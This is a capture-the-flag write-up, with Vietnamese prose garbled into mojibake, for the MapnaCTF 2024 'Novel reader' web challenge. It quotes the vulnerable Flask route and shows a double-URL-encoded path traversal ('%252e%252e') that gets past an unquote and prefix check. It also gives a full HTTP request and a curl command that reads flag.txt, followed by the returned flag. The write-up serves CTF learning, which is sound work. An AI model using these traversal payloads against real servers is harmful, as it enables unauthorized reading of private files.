---
title: "MapnaCTF 2024 - web"
layout: single
excerpt: "MAPNA CTF 2024, a beginner-friendly Capture The Flag event, to be held between. Sat, 20 Jan. 2024, 15:00 UTC â€” Sun, 21 Jan. 2024, 15:00 UTC ğŸ’» "
header:
show_date: true
classes: wide
header:
  teaser: "https://hackmd.io/_uploads/H1CoYbosp.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://hackmd.io/_uploads/H1CoYbosp.png">
</p>

# Table
```
- Web
  Novel reader: 42 point - 144 solves
  Advanced JSON Cutifier: 59 point - 88 solves
```

# Web
## Novel reader - 44 point
### Description
```
We have many fun novels for ya...
http://3.64.250.135:9000
```

Source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2024/mapnactf2024/novel-reader_d78366cb079727a6bd3809219df9bc7835d17fd1.txz)

### Solution

Giao diá»‡n web nhÆ° sau: 
![image](https://hackmd.io/_uploads/ryT0JzCKa.png)

á»¨ng dá»¥ng cÃ³ 2 chá»©c nÄƒng chÃ­nh lÃ  readfile vÃ  charge account. Máº·c Ä‘á»‹nh Má»—i ngÆ°á»i dÃ¹ng ban Ä‘áº§u sáº½ cÃ³ 100 Balance vÃ  1 Words Balance.

Trong `list private` cá»§a endpoint `/api/list-private-novels` cÃ³ chá»©a file 

```
["A-Secret-Tale.txt"]
```

vá»›i ná»™i dung cÃ³ chá»©a FLAG: 
```
Once a upon time there was a flag. The flag was read like this: MAPNA{test-flag}. FIN.
```

=> Má»¥c tiÃªu: Ä‘á»c Ä‘Æ°á»£c file `A-Secret-Tale.txt`

trong `main.py`
```py
@app.get('/api/read/<path:name>')
def readNovel(name):
    name = unquote(name)
    if(not name.startswith('public/')):
        return {'success': False, 'msg': 'You can only read public novels!'}, 400
    buf = readFile(name).split(' ')
    buf = ' '.join(buf[0:session['words_balance']])+'... Charge your account to unlock more of the novel!'
    return {'success': True, 'msg': buf}
```

á»Ÿ Ä‘Ã¢y ta tháº¥y giÃ¡ trá»‹ truyá»n vÃ o Ä‘Æ°á»£c Ä‘Æ°a vÃ o hÃ m readFile Ä‘á»ƒ Ä‘á»c vÃ  tráº£ vá» dá»¯ liá»‡u cho ngÆ°á»i dÃ¹ng náº¿u cÃ³ Ä‘á»§ `words_balance`.

```http://3.64.250.135:9000/api/read/$PAYLOAD_INJEC```

á» Ä‘Ã¢y ta cÃ³ thá»ƒ path travesal vÆ°á»£t qua hÃ m `unqute` cá»§a `urllib.parse` báº±ng cÃ¡ch url encoding payload `%2e` => `%252f`

tÃ´i Ä‘Ã£ thá»­ Ä‘á»c file `A-Secret-Tale.txt` báº±ng cÃ¡ch nÃ y vá»›i payload:
```
GET /api/read/public%252F%252E%252E%252Fprivate%252FA%252DSecret%252DTale%252Etxt HTTP/1.1
Host: 3.64.250.135:9000
Accept: */*
X-Requested-With: XMLHttpRequest
Referer: http://3.64.250.135:9000/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: session=[REDACTED]
Connection: close
```

tuy nhiÃªn, nÃ³ khÃ´ng thÃ nh cÃ´ng do chÃºng ta khÃ´ng cÃ³ Ä‘á»§ `words_balance`. 

![image](https://hackmd.io/_uploads/S1jdMGRta.png)

payload cuá»‘i:
```
/api/read/public/%252e%252e/%252e%252e/flag.txt
```

### Script
```py
curl http://3.64.250.135:9000/api/read/public/%252e%252e/%252e%252e/flag.txt
```

result:
```
{"msg":"MAPNA{uhhh-1-7h1nk-1-f0r607-70-ch3ck-cr3d17>0-4b331d4b}\n\n... Charge your account to unlock more of the novel!","success":true}
```


